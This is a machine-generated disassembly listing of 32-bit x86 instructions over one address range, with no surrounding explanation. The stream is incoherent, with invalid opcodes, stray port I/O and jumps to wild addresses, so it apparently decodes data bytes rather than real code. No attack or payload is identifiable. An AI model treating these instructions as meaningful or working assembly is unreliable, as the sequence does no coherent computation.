  410541:	jne    0x4104f1
  410543:	dec    ecx
  410544:	xlat   BYTE PTR ds:[ebx]
  410545:	pop    es
  410546:	es pop ecx
  410548:	mov    dh,0xbb
  41054a:	data16 mov ch,0x94
  41054d:	fs addr16 jae 0x4105a0
  410551:	lahf   
  410552:	pop    ss
  410553:	test   al,0x6b
  410555:	jecxz  0x4105a7
  410557:	out    0xf3,eax
  410559:	es fwait
  41055b:	jl     0x4105b2
  41055d:	dec    eax
  41055e:	scas   al,BYTE PTR es:[edi]
  41055f:	adc    ch,bl
  410561:	and    al,0x10
  410563:	cmp    DWORD PTR [edi+0x64],edx
  410566:	scas   eax,DWORD PTR es:[edi]
  410567:	jnp    0x4105b5
  410569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41056a:	cmp    ch,BYTE PTR [ecx+eax*8]
  41056d:	push   ds
  41056e:	aam    0xf1
  410570:	loope  0x41059e
  410572:	pop    ss
  410573:	jb     0x4105c5
  410575:	neg    DWORD PTR [ecx+esi*2-0x4054bef5]
  41057c:	mov    cl,0x3a
  41057e:	adc    ah,BYTE PTR [edi+0x4d]
  410581:	int    0xf9
  410583:	xor    DWORD PTR [ebp+eiz*2+0x3f7ca1c8],ebx
  41058a:	pop    ecx
  41058b:	fimul  WORD PTR [ecx+0x3]
  41058e:	xor    BYTE PTR [ebx+0x10],bh
  410591:	mov    eax,es:0xe78c0fb5
  410597:	daa    
  410598:	sub    eax,edx
  41059a:	test   eax,0x91da9310
  41059f:	mov    DWORD PTR [eax],edi
  4105a1:	jns    0x41053c
  4105a3:	mov    bl,0xff
  4105a5:	jmp    0xdcd198ea
  4105aa:	mov    ss,WORD PTR [ebx*2+0x4c2091e4]
  4105b1:	xor    ebp,ebp
  4105b3:	je     0x410620
  4105b5:	push   ecx
  4105b6:	adc    cl,BYTE PTR [edi+0x4dff64f7]
  4105bc:	stos   BYTE PTR es:[edi],al
  4105bd:	push   esp
  4105be:	das    
  4105bf:	es cli 
  4105c1:	aaa    
  4105c2:	pop    ebx
  4105c3:	retf   0xf7c3
  4105c6:	ds pop ss
  4105c8:	mov    dl,dh
  4105ca:	lahf   
  4105cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105cc:	loop   0x410638
  4105ce:	es dec ecx
  4105d0:	test   dh,ch
  4105d2:	and    al,al
  4105d4:	sub    dh,BYTE PTR [ecx-0x7523626a]
  4105da:	(bad)  
  4105db:	pop    edx
  4105dc:	mov    cl,0xaa
  4105de:	leave  
  4105df:	sbb    DWORD PTR [ebp-0x317bae5f],edx
  4105e5:	(bad)  
  4105e7:	in     al,0xf5
  4105e9:	jae    0x4105ae
  4105eb:	int    0x1d
  4105ed:	into   
  4105ee:	cmp    bh,BYTE PTR fs:[ecx]
  4105f1:	dec    ebp
  4105f2:	sahf   
  4105f3:	outs   dx,BYTE PTR ds:[esi]
  4105f4:	pop    ds
  4105f5:	rcl    DWORD PTR [eax],1
  4105f7:	mov    dh,bl
  4105f9:	dec    eax
  4105fa:	mov    ebp,0xf8709c84
  4105ff:	and    DWORD PTR [ebx-0x5b],eax
  410602:	jecxz  0x410592
  410604:	(bad)
  410607:	pop    edi
  410608:	repnz out 0x7a,eax
  41060b:	out    0x15,eax
  41060d:	rcl    DWORD PTR [ebp+0x6436475b],0x95
  410614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410615:	jmp    0xdc9e02ab
  41061a:	out    0xec,eax
  41061c:	push   edi
  41061d:	pop    edi
  41061e:	jnp    0x4105f2
  410620:	mov    ebx,0x3f131bcd
  410625:	add    esi,ebp
  410627:	push   esp
  410628:	cmp    ebx,edi
  41062a:	popf   
  41062b:	lds    ebp,FWORD PTR [ebp+0x3a]
  41062e:	mov    cl,0xf4
  410630:	mov    esi,0x1977cb94
  410635:	push   esp
  410636:	push   es
  410637:	sti    
  410638:	ss repz or esi,DWORD PTR es:[eax+0x7c47bd20]
  410641:	cld    
  410642:	dec    esi
  410643:	sub    dh,ch
  410645:	xchg   esi,eax
  410646:	aaa    
  410647:	pop    ss
  410648:	xchg   edi,eax
  410649:	xor    ah,BYTE PTR [ebx+0x767a121d]
  41064f:	pop    ds
  410650:	sahf   
  410651:	inc    ecx
  410652:	vpaddsw xmm2,xmm6,XMMWORD PTR [esi]
  410656:	rcl    DWORD PTR [ecx+ecx*8-0xfed1b61],0x41
  41065e:	xchg   esp,eax
  41065f:	add    eax,0xbb50d4e1
  410664:	adc    esp,DWORD PTR [ecx-0x1f]
  410667:	pushf  
  410668:	loop   0x41062f
  41066a:	sbb    cl,BYTE PTR [ebx+0x50]
  41066d:	in     al,0xc0
  41066f:	mov    ds:0xfb9b8a0,eax
  410674:	frndint 
  410676:	ds clc 
  410678:	test   al,0x93
  41067a:	lds    esi,FWORD PTR [ebx]
  41067c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41067d:	(bad)  
  41067e:	loope  0x41065f
  410680:	stos   BYTE PTR es:[edi],al
  410681:	sub    eax,0xf5db69c
  410686:	aad    0xf9
  410688:	pop    esi
  410689:	(bad)  
  41068a:	pop    edx
  41068b:	push   ds
  41068c:	in     al,dx
  41068d:	fwait
  41068e:	test   DWORD PTR [ecx-0x3b4392d0],esp
  410694:	(bad)  
  410695:	into   
  410696:	in     al,dx
  410697:	jbe    0x41070f
  410699:	mov    ah,0x41
  41069b:	mov    dl,0xa
  41069d:	mov    BYTE PTR [eax-0x4],cl
  4106a0:	adc    eax,0xa63af445
  4106a5:	mov    dl,0x5e
  4106a7:	mov    edx,DWORD PTR ds:0xf292db0e
  4106ad:	or     BYTE PTR [ebp+edi*1-0x6b0ba300],ah
  4106b4:	sbb    DWORD PTR [eax+0x66692e17],edx
  4106ba:	pop    esi
  4106bb:	jb     0x410666
  4106bd:	test   bl,dl
  4106bf:	in     eax,dx
  4106c0:	outs   dx,BYTE PTR ds:[esi]
  4106c1:	(bad)  
  4106c2:	in     eax,dx
  4106c3:	cmp    bh,al
  4106c5:	sub    eax,0x8055de86
  4106ca:	and    DWORD PTR [edx-0x24880141],eax
  4106d0:	dec    eax
  4106d1:	mov    ebx,0x83a0b475
  4106d6:	aas    
  4106d7:	test   DWORD PTR [edi+0x90feaa1],edi
  4106dd:	mov    ah,BYTE PTR ds:0x5a416963
  4106e3:	mov    ds:0x445f22b0,eax
  4106e8:	(bad)  
  4106e9:	xchg   ecx,eax
  4106ea:	push   ds
  4106eb:	xor    ch,ch
  4106ed:	popf   
  4106ee:	xchg   esi,eax
  4106ef:	push   es
  4106f0:	ins    DWORD PTR es:[edi],dx
  4106f1:	popa   
  4106f2:	int    0xc4
  4106f4:	daa    
  4106f5:	fnsave [esi+0x471f70a8]
  4106fb:	ret    0x8fc7
  4106fe:	add    esp,DWORD PTR [edx]
  410700:	jge    0x410776
  410702:	mov    bh,0x28
  410704:	xchg   ecx,eax
  410705:	push   eax
  410706:	jno    0x410690
  410708:	lds    esi,FWORD PTR [esi-0x388e4b94]
  41070e:	fidiv  WORD PTR [eax+0x5f]
  410711:	in     eax,0x87
  410713:	aam    0x82
  410715:	fwait
  410716:	push   ebp
  410717:	mov    WORD PTR [edx+edi*1],cs
  41071a:	add    edx,edi
  41071c:	push   ss
  41071d:	push   edi
  41071e:	ror    BYTE PTR [edi-0x4e],1
  410721:	push   ss
  410722:	sub    eax,0xe7b068a0
  410727:	clc    
  410728:	loop   0x4106ba
  41072a:	std    
  41072b:	and    al,0x85
  41072d:	clc    
  41072e:	push   cs
  41072f:	jl     0xceace9c2
  410735:	jbe    0x4107ac
  410737:	repnz test DWORD PTR [eax-0x171456e1],ebx
  41073e:	ss and eax,0x388054bd
  410744:	cmp    DWORD PTR [edi-0x5d],edi
  410747:	jl     0x4106cb
  410749:	sub    ah,dl
  41074b:	mov    esi,0xd268ae76
  410750:	scas   eax,DWORD PTR es:[edi]
  410751:	dec    edi
  410752:	out    0xe,al
  410754:	je     0x410745
  410756:	pop    esp
  410757:	stos   DWORD PTR es:[edi],eax
  410758:	stos   BYTE PTR es:[edi],al
  410759:	retf   0xa4c3
  41075c:	shl    ebx,cl
  41075e:	jno    0x410788
  410760:	and    eax,0xa6cd9e97
  410765:	fsub   DWORD PTR [esi-0xb62d9e3]
  41076b:	test   al,0x2b
  41076d:	mov    cl,0xf5
  41076f:	mov    edi,0xe237cec6
  410774:	outs   dx,DWORD PTR ds:[esi]
  410775:	call   0xf9ec:0x1412e7d2
  41077c:	push   ebp
  41077d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41077e:	pop    esp
  41077f:	gs push ecx
  410781:	xchg   edi,eax
  410782:	int    0xf2
  410784:	xlat   BYTE PTR ds:[ebx]
  410785:	xor    ecx,DWORD PTR ds:0xff4034a4
  41078b:	and    esp,DWORD PTR [ebx-0x45488c50]
  410791:	cdq    
  410792:	push   0x476dbf67
  410797:	mov    ds:0x552b7081,al
  41079c:	sti    
  41079d:	mov    ebx,DWORD PTR [esi]
  41079f:	xor    esp,DWORD PTR [edi-0x73]
  4107a2:	push   edx
  4107a3:	aaa    
  4107a4:	rol    BYTE PTR [esi+0x55],1
  4107a7:	cli    
  4107a8:	jle    0x4107f9
  4107aa:	addr16 mov bl,0x2f
  4107ad:	jl     0x410747
  4107af:	imul   ecx,ebx,0xffffff88
  4107b2:	dec    ecx
  4107b3:	mov    gs,WORD PTR [ebx+0xddb3c6d]
  4107b9:	inc    esp
  4107ba:	or     BYTE PTR [ebp-0x109cf5b8],dl
  4107c0:	ins    DWORD PTR es:[edi],dx
  4107c1:	jmp    ecx
  4107c3:	(bad)  
  4107c4:	fstp   TBYTE PTR [edi+0x467531d9]
  4107ca:	mov    gs,WORD PTR [edx+0x1a]
  4107cd:	aas    
  4107ce:	cmp    DWORD PTR [edx],esi
  4107d0:	js     0x410780
  4107d2:	fstp   st(7)
  4107d4:	cmp    BYTE PTR [edx],bl
  4107d6:	(bad)  
  4107d8:	push   ecx
  4107d9:	rol    DWORD PTR [edi],0x52
  4107dc:	(bad)  
  4107dd:	retf   0x7f85
  4107e0:	leave  
  4107e1:	xor    ebx,DWORD PTR [ebp-0x6d178d67]
  4107e7:	or     esi,DWORD PTR [edx+ebp*8-0x31df40db]
  4107ee:	cwde   
  4107ef:	sahf   
  4107f0:	mov    dh,dl
  4107f2:	and    DWORD PTR [ebp+0x48],esp
  4107f5:	cdq    
  4107f6:	ret    0x4cd7
  4107f9:	lahf   
  4107fa:	sahf   
  4107fb:	repz das 
  4107fd:	pop    ebx
  4107fe:	mov    esi,0x18d98943
  410803:	sbb    bl,BYTE PTR [esp+esi*2+0x26206ed1]
  41080a:	mov    bh,0xac
  41080c:	stos   DWORD PTR es:[edi],eax
  41080d:	mov    ecx,DWORD PTR [edx+0x56052e5c]
  410813:	add    BYTE PTR [eax],ah
  410815:	add    eax,0x9df6daa4
  41081a:	std    
  41081b:	pop    ds
  41081c:	ds push esp
  41081e:	jp     0x410814
  410820:	daa    
  410821:	test   eax,0x16a98dbe
  410826:	mov    ch,0xd
  410828:	mov    bl,0x1f
  41082a:	dec    ebx
  41082b:	cmp    eax,0x77153620
  410830:	mov    esi,0xf90638b4
  410835:	xchg   ecx,eax
  410836:	pop    edi
  410837:	shl    BYTE PTR [ebx+edi*1-0x238fcd1b],1
  41083e:	xor    eax,0x3b50f969
  410843:	dec    ebx
  410844:	fwait
  410845:	sub    DWORD PTR [ebp+0x6aa9207a],esp
  41084b:	cmp    BYTE PTR ss:[ecx-0x34527bfb],ah
  410852:	(bad)  [eax+esi*8-0x182ee79e]
  410859:	pop    esp
  41085a:	es mov al,0x1e
  41085d:	ror    BYTE PTR [edx+0x3d],cl
  410860:	adc    dh,dl
  410862:	jbe    0x410854
  410864:	jmp    0x410856
  410866:	jmp    0x68a6:0x3d8e9aa9
  41086d:	push   esi
  41086e:	std    
  41086f:	dec    ebp
  410871:	mov    ecx,edx
  410873:	dec    esp
  410874:	xor    DWORD PTR [edx],eax
  410876:	jo     0x410809
  410878:	cs in  eax,dx
  41087a:	xor    cl,BYTE PTR ds:[esi-0x46]
  41087e:	loopne 0x410886
  410880:	ds sub eax,0x378cde9f
  410886:	adc    cl,ah
  410888:	xchg   edi,eax
  410889:	popa   
  41088a:	mov    edx,0x4445a2b4
  41088f:	clc    
  410890:	mov    bl,0x3e
  410892:	fiadd  DWORD PTR es:[edi-0x49df2f07]
  410899:	cs mov ebx,0xebdef86b
  41089f:	mov    ah,0x31
  4108a1:	inc    DWORD PTR [ebx]
  4108a3:	and    dl,BYTE PTR [edx+edi*2]
  4108a6:	test   ebx,esp
  4108a8:	shr    BYTE PTR [edi+eiz*1],0x64
  4108ac:	test   al,0x53
  4108ae:	add    BYTE PTR [eax-0x40],al
  4108b1:	push   ss
  4108b2:	mov    ?,edi
  4108b4:	pop    ds
  4108b5:	adc    bl,BYTE PTR [edi-0x2a]
  4108b8:	outs   dx,BYTE PTR ds:[esi]
  4108b9:	xor    cl,BYTE PTR [edx+0x6b]
  4108bc:	mov    bh,bl
  4108be:	lahf   
  4108bf:	mov    WORD PTR [edi],ds
  4108c1:	cld    
  4108c2:	cld    
  4108c3:	or     DWORD PTR [ebp+0x12],0x2b1a8fd2
  4108ca:	arpl   WORD PTR [esi+0x20547080],ax
  4108d0:	and    ebp,0x6
  4108d3:	adc    eax,0xa5249b68
  4108d8:	(bad)  
  4108d9:	(bad)  
  4108db:	js     0x4108fc
  4108dd:	scas   al,BYTE PTR es:[edi]
  4108de:	in     eax,dx
  4108df:	mov    DWORD PTR [ebx],edx
  4108e1:	jle    0x4108a6
  4108e3:	xor    ebx,DWORD PTR [esi-0x2ba97c3d]
  4108e9:	xor    dl,dl
  4108eb:	ficomp DWORD PTR [ebx+0x47]
  4108ee:	leave  
  4108ef:	js     0x4108b1
  4108f1:	cmc    
  4108f2:	fisttp WORD PTR [ecx+0xc]
  4108f5:	jne    0x4108fe
  4108f7:	lds    edi,FWORD PTR [eax-0x7b]
  4108fa:	clc    
  4108fb:	mov    edx,0x2e27f8f9
  410900:	adc    dl,BYTE PTR [edi]
  410902:	xchg   esi,eax
  410903:	rol    BYTE PTR [ecx+0x70],cl
  410906:	mov    ah,BYTE PTR [edi]
  410908:	mov    ds:0x6861b154,al
  41090d:	jecxz  0x4108ec
  41090f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410910:	lock or al,0xb0
  410913:	xor    ch,cl
  410915:	xchg   ebp,eax
  410916:	sahf   
  410917:	pusha  
  410918:	loop   0x410964
  41091a:	out    dx,al
  41091b:	test   al,0xa5
  41091d:	mov    BYTE PTR [eax+0x2],0x62
  410921:	sahf   
  410922:	sahf   
  410923:	leave  
  410924:	jg     0x41090d
  410926:	iret   
  410927:	(bad)  
  410928:	push   ds
  410929:	jge    0x41093e
  41092b:	out    dx,eax
  41092c:	adc    ch,0x13
  41092f:	xchg   ebp,eax
  410930:	jmp    0x4108d0
  410932:	push   ds
  410933:	outs   dx,BYTE PTR ds:[esi]
  410934:	push   ebp
  410935:	push   edx
  410936:	and    ebx,DWORD PTR [edx-0x35]
  410939:	inc    edi
  41093a:	mov    bh,0x53
  41093c:	xor    DWORD PTR [ecx+ebx*1-0x60],0xdcb331ef
  410944:	dec    esi
  410945:	mov    al,ds:0xff26dfc0
  41094a:	sub    dh,BYTE PTR [eax-0x6c541d65]
  410950:	loop   0x410975
  410952:	imul   esp,DWORD PTR [esi+0x9],0xfca40f5d
  410959:	outs   dx,BYTE PTR ds:[esi]
  41095a:	push   ebp
  41095b:	popf   
  41095c:	push   ax
  41095e:	jae    0x41097c
  410960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410961:	dec    ebx
  410962:	test   DWORD PTR ds:0x4b0283f5,edx
  410968:	sbb    al,BYTE PTR [ecx-0x2332edaa]
  41096e:	loop   0x4109b3
  410970:	dec    eax
  410971:	(bad)  
  410972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410973:	or     dl,BYTE PTR [esi+esi*2+0x300514d5]
  41097a:	sub    bh,dl
  41097c:	dec    edx
  41097d:	mov    ebp,DWORD PTR [ebp+0x2f]
  410980:	mov    cl,0x5f
  410982:	mov    dl,0xa4
  410984:	lods   al,BYTE PTR ds:[esi]
  410985:	gs call 0x5a6f:0xd28b4425
  41098d:	sahf   
  41098e:	ds jns 0x4109e3
  410991:	jo     0x41092b
  410993:	jmp    0xa30c55a6
  410998:	pop    edi
  410999:	nop
  41099a:	mov    DWORD PTR ds:0xadca6566,0xf2350a53
  4109a4:	int3   
  4109a5:	sub    DWORD PTR [ecx-0x5907ea95],edx
  4109ab:	or     DWORD PTR [ebp-0x6b],ecx
  4109ae:	(bad)  
  4109af:	enter  0x6fb0,0x9c
  4109b3:	mov    cl,dl
  4109b5:	das    
  4109b6:	ds loopne 0x410a1d
  4109b9:	aam    0x65
  4109bb:	icebp  
  4109bc:	xchg   edx,eax
  4109bd:	or     DWORD PTR [ecx],esp
  4109bf:	cld    
  4109c0:	or     ah,0xc2
  4109c3:	test   BYTE PTR [eax-0x38dc2cf1],bh
  4109c9:	mov    ebp,0x2acd1eca
  4109ce:	int    0xc1
  4109d0:	or     DWORD PTR [ebx],eax
  4109d2:	stos   DWORD PTR es:[edi],eax
  4109d3:	iret   
  4109d4:	test   BYTE PTR [edx+0x277a4722],dl
  4109da:	jg     0x4109f0
  4109dc:	in     eax,0x91
  4109de:	cmp    eax,DWORD PTR [eax]
  4109e0:	mov    WORD PTR [esi],fs
  4109e2:	add    al,0x84
  4109e4:	fucomip st,st(2)
  4109e6:	rcl    DWORD PTR [ecx-0x7e],cl
  4109e9:	stc    
  4109ea:	cs mov dl,bl
  4109ed:	call   0x283578f7
  4109f2:	inc    ecx
  4109f3:	les    ebx,FWORD PTR [ebx+0x3d]
  4109f6:	jo     0x4109ce
  4109f8:	imul   edx,eax,0x2d
  4109fb:	daa    
  4109fc:	and    BYTE PTR [ecx+0x50],dh
  4109ff:	mov    DWORD PTR [ecx-0x63],edi
  410a02:	daa    
  410a03:	pop    ebp
  410a04:	mov    esi,0x91209ff2
  410a09:	pop    ecx
  410a0a:	int    0x55
  410a0c:	mov    esi,0x8df36bb2
  410a11:	pop    edx
  410a12:	jge    0x4109f0
  410a14:	push   edx
  410a15:	jmp    0xedb2:0x83487467
  410a1c:	jle    0x410a5e
  410a1e:	fucomip st,st(1)
  410a20:	in     al,dx
  410a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a22:	mov    ah,0xb1
  410a24:	dec    ebp
  410a25:	xlat   BYTE PTR ds:[ebx]
  410a26:	les    ebp,FWORD PTR [eax+0x2e]
  410a29:	add    dh,BYTE PTR [ecx+eiz*4-0x15]
  410a2d:	frstpm(287 only) 
  410a2f:	xor    DWORD PTR [ebx],esi
  410a31:	mov    ?,edi
  410a33:	adc    DWORD PTR [ebx],ebx
  410a35:	inc    edx
  410a36:	cmp    eax,0x76875e9e
  410a3b:	icebp  
  410a3c:	mov    edx,0x46079ed9
  410a41:	mov    ebx,0x26409189
  410a46:	call   0x12e438a2
  410a4b:	adc    ch,BYTE PTR [edx]
  410a4d:	or     eax,ebp
  410a4f:	and    ecx,DWORD PTR [ebx+0x2d968ee]
  410a55:	ror    BYTE PTR [esi-0x16],cl
  410a58:	out    dx,al
  410a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a5a:	bound  edi,QWORD PTR cs:[esi]
  410a5d:	test   WORD PTR [esp+edi*2-0x1c],di
  410a62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a63:	jo     0x410a7a
  410a65:	xor    ah,BYTE PTR [eax+0x46429c72]
  410a6b:	cli    
  410a6c:	(bad)  
  410a6d:	fcom   QWORD PTR [ecx]
  410a6f:	scas   al,BYTE PTR es:[edi]
  410a70:	gs call 0xbdbd:0xf791e802
  410a78:	ret    
  410a79:	push   edi
  410a7a:	mov    ebp,0x652bb6b2
  410a7f:	fild   QWORD PTR [esi]
  410a81:	pop    esp
  410a82:	jge    0x410ae2
  410a84:	arpl   WORD PTR [ebx+0x725ac248],bp
  410a8a:	adc    al,0x2a
  410a8c:	iret   
  410a8d:	xchg   ebp,eax
  410a8e:	les    esi,FWORD PTR [edx-0x4b38e246]
  410a94:	jmp    0x5411:0xe1eb75e9
  410a9b:	test   BYTE PTR [edx-0x6c],bl
  410a9e:	cli    
  410a9f:	jne    0x410a30
  410aa1:	scas   al,BYTE PTR es:[edi]
  410aa2:	sub    al,BYTE PTR [esi+0x2d]
  410aa5:	and    edi,DWORD PTR cs:[edx-0x72]
  410aa9:	sahf   
  410aaa:	or     DWORD PTR [ebp+0x6a],esi
  410aad:	pop    ecx
  410aae:	aam    0x34
  410ab0:	mov    edx,0xebf7f088
  410ab5:	sbb    DWORD PTR [edi+edi*1],0xfffffff2
  410ab9:	pushf  
  410aba:	lods   eax,DWORD PTR ds:[esi]
  410abb:	(bad)  
  410abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410abd:	push   ecx
  410abe:	lock xor al,0xcd
  410ac1:	mov    edx,0xa132f529
  410ac6:	leave  
  410ac7:	nop
  410ac8:	aaa    
  410ac9:	jp     0x410aa5
  410acb:	lods   al,BYTE PTR ds:[esi]
  410acc:	dec    ebp
  410acd:	mov    dh,0x79
  410acf:	sbb    dh,BYTE PTR [edi]
  410ad1:	das    
  410ad2:	cmp    ch,BYTE PTR [ecx-0x73]
  410ad5:	and    eax,0x42036404
  410ada:	xor    edi,DWORD PTR [ebx+ebx*1+0x36]
  410ade:	sbb    ch,dh
  410ae0:	xrelease mov DWORD PTR [esi-0x2b],0x396d709f
  410ae8:	xor    bl,BYTE PTR [ecx-0x4521cda7]
  410aee:	repz push edi
  410af0:	into   
  410af1:	pop    ss
  410af2:	adc    eax,0x39a6ac4d
  410af7:	idiv   BYTE PTR [edx+0x7aa968e]
  410afd:	retf   
  410afe:	pop    ds
  410aff:	icebp  
  410b00:	xor    edi,edx
  410b02:	inc    ecx
  410b04:	(bad)  
  410b05:	std    
  410b06:	add    al,0x73
  410b08:	push   cs
  410b09:	push   0xc
  410b0b:	cld    
  410b0c:	jg     0x410abb
  410b0e:	push   0x2e8c9d44
  410b13:	loope  0x410ac0
  410b15:	cmp    dh,al
  410b17:	fs pop ebx
  410b19:	iret   
  410b1a:	adc    ebx,DWORD PTR [ebp-0x9]
  410b1d:	fwait
  410b1e:	xor    eax,0x74f0ba56
  410b23:	ret    0x56a2
  410b26:	jae    0x410aab
  410b28:	xchg   esp,eax
  410b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b2a:	sub    al,0xd8
  410b2c:	add    edx,DWORD PTR [edi+edx*8+0x45]
  410b30:	repz inc esi
  410b32:	mov    ds:0x48bbf6e1,al
  410b37:	(bad)  
  410b38:	or     eax,0xc909f783
  410b3d:	aas    
  410b3e:	das    
  410b3f:	dec    edx
  410b40:	cmp    BYTE PTR [esp+ebx*2-0x77],bl
  410b44:	and    DWORD PTR [ebp+0x33],0x60
  410b48:	mov    ecx,0x925aee7d
  410b4d:	cwde   
  410b4e:	sbb    DWORD PTR [eax],edi
  410b50:	sub    esi,edi
  410b52:	in     al,dx
  410b53:	add    DWORD PTR [ebx+0x4],ecx
  410b56:	aad    0x79
  410b58:	adc    BYTE PTR [ebx+0xe4fc5a2],ah
  410b5e:	push   0x2fa76fb5
  410b63:	adc    DWORD PTR [edx],edi
  410b65:	inc    esp
  410b66:	int3   
  410b67:	jno    0x410b16
  410b69:	lods   al,BYTE PTR ds:[esi]
  410b6a:	sahf   
  410b6b:	das    
  410b6c:	push   cs
  410b6d:	mov    al,0xba
  410b6f:	adc    al,0x2d
  410b71:	shl    DWORD PTR [eax+0x1f],cl
  410b74:	(bad)  [ebx+0x311c089d]
  410b7a:	xchg   edi,eax
  410b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b7c:	std    
  410b7d:	push   0x29ea95fe
  410b82:	cmp    BYTE PTR [ebp+0x27d5ca5c],bl
  410b88:	add    eax,0x46d87635
  410b8d:	fs pop esp
  410b8f:	call   0x150c:0x11be85db
  410b96:	jne    0x410b5c
  410b98:	cmp    al,0x57
  410b9a:	sbb    dl,ch
  410b9c:	neg    edx
  410b9e:	jge    0x410c14
  410ba0:	pop    ds
  410ba1:	mov    dl,0xc1
  410ba3:	das    
  410ba4:	in     eax,0x1c
  410ba6:	or     al,0x24
  410ba8:	and    bh,BYTE PTR [ebp-0x7f89ff3c]
  410bae:	loope  0x410b5e
  410bb0:	inc    eax
  410bb1:	dec    esp
  410bb2:	pop    ds
  410bb3:	iret   
  410bb4:	pop    ecx
  410bb5:	(bad)  
  410bb6:	jmp    0xf9b8a405
  410bbb:	test   eax,0xbbe1cdc3
  410bc0:	pop    edx
  410bc1:	add    DWORD PTR [edx],0x7c3f0513
  410bc7:	sti    
  410bc8:	mov    ebx,edi
  410bca:	xchg   ebx,eax
  410bcb:	cmp    BYTE PTR [ebx+0x21],al
  410bce:	dec    esi
  410bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bd0:	aam    0x36
  410bd2:	push   esp
  410bd3:	lea    esi,[esi-0x1c]
  410bd6:	addr16 pop ss
  410bd8:	nop
  410bd9:	mov    cl,BYTE PTR [edx+0x5d]
  410bdc:	pop    ecx
  410bdd:	mov    cl,0x30
  410bdf:	push   eax
  410be0:	inc    edx
  410be1:	aas    
  410be2:	bound  edi,QWORD PTR [ebp+0x776225ce]
  410be8:	stos   BYTE PTR es:[edi],al
  410be9:	mov    al,0xe9
  410beb:	cmp    al,0x27
  410bed:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  410bef:	imul   ebp,DWORD PTR [ebx],0xffffff97
  410bf2:	xchg   BYTE PTR [ebx],ch
  410bf4:	cli    
  410bf5:	mov    BYTE PTR [eax+0x5b313857],ah
  410bfb:	jmp    0xeb960d25
  410c00:	mov    edx,0x6a4db436
  410c05:	and    al,dh
  410c07:	xchg   ecx,eax
  410c08:	push   eax
  410c09:	mov    ebx,0x631ed82e
  410c0e:	pop    ss
  410c0f:	xchg   BYTE PTR [eax-0x40],dl
  410c12:	sahf   
  410c13:	repnz test eax,0x7f10999
  410c19:	hlt    
  410c1a:	xchg   edx,eax
  410c1b:	cwde   
  410c1c:	xor    ah,BYTE PTR [edi-0x21]
  410c1f:	push   ecx
  410c20:	aad    0x8a
  410c22:	inc    edx
  410c23:	loopne 0x410ba5
  410c25:	ins    DWORD PTR es:[edi],dx
  410c26:	pop    edi
  410c27:	rcl    esp,0xbb
  410c2a:	test   BYTE PTR [eax+esi*8+0xd],dh
  410c2e:	push   cs
  410c2f:	push   esi
  410c30:	cmp    DWORD PTR [ebx],edi
  410c32:	xor    eax,0x7912ed3e
  410c37:	loope  0x410c6a
  410c39:	jno    0x410bff
  410c3b:	jnp    0x410bda
  410c3d:	mov    al,0x94
  410c3f:	jb     0x410c1c
  410c41:	add    eax,0xb7e62cb5
  410c46:	mov    bh,0x9d
  410c48:	cld    
  410c49:	scas   al,BYTE PTR es:[edi]
  410c4a:	outs   dx,DWORD PTR ds:[esi]
  410c4b:	sub    eax,0xdfa40ed6
  410c50:	xor    eax,0xa93f7cd8
  410c55:	pop    ebp
  410c56:	lods   eax,DWORD PTR ds:[esi]
  410c57:	pop    esp
  410c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c59:	clc    
  410c5a:	mov    esi,0x5c397e06
  410c5f:	dec    ebx
  410c60:	xor    dl,ch
  410c62:	lods   eax,DWORD PTR ds:[esi]
  410c63:	aaa    
  410c64:	xchg   edi,eax
  410c65:	jb     0xfac24eab
  410c6b:	adc    BYTE PTR [esi-0x4],cl
  410c6e:	test   BYTE PTR ds:0x282575fc,0x5e
  410c75:	daa    
  410c76:	xor    eax,0x3af27dea
  410c7b:	rol    DWORD PTR [ecx+0x49],0x6
  410c7f:	test   DWORD PTR [ecx+ebp*4+0x66],esp
  410c83:	test   BYTE PTR [eax],bl
  410c85:	mov    eax,ds:0xb11d2a67
  410c8a:	scas   al,BYTE PTR es:[edi]
  410c8b:	ficom  WORD PTR ds:[esi+ecx*8+0x1ed4f041]
  410c93:	into   
  410c94:	push   es
  410c95:	sub    DWORD PTR ds:0xf1d8d216,0xffffff8b
  410c9c:	mov    ds:0x772bec5d,eax
  410ca1:	or     BYTE PTR [bp+si-0x71b0],cl
  410ca6:	shr    BYTE PTR [esi-0x725b7b2e],1
  410cac:	int3   
  410cad:	cmp    edi,DWORD PTR [esi]
  410caf:	jmp    0x410cca
  410cb1:	dec    eax
  410cb2:	or     BYTE PTR [ebx-0x43529ae8],bl
  410cb8:	test   BYTE PTR [esi+eax*4],0x93
  410cbc:	in     al,0x49
  410cbe:	jmp    0x33e6530d
  410cc3:	repz scas eax,DWORD PTR es:[edi]
  410cc5:	lea    esp,ds:0xed825fa1
  410ccb:	punpckldq mm1,DWORD PTR [edx+0x3]
  410ccf:	aam    0xd5
  410cd1:	and    al,0xba
  410cd3:	loop   0x410d09
  410cd5:	inc    esi
  410cd6:	mov    ecx,0x9abeb76c
  410cdb:	sub    al,0xf8
  410cdd:	sahf   
  410cde:	aaa    
  410cdf:	pop    ebp
  410ce0:	jg     0x410cb7
  410ce2:	mov    ch,0x92
  410ce4:	mov    eax,ds:0xe998bd3f
  410ce9:	and    edi,DWORD PTR [ecx+0x2a207cd3]
  410cef:	jo     0x410d2d
  410cf1:	mov    ebp,0x19f58e66
  410cf6:	shl    BYTE PTR [ebp-0x11deb52e],1
  410cfc:	jl     0x410cae
  410cfe:	sbb    eax,0xb38b15bc
  410d03:	sub    eax,0x112a9b26
  410d08:	daa    
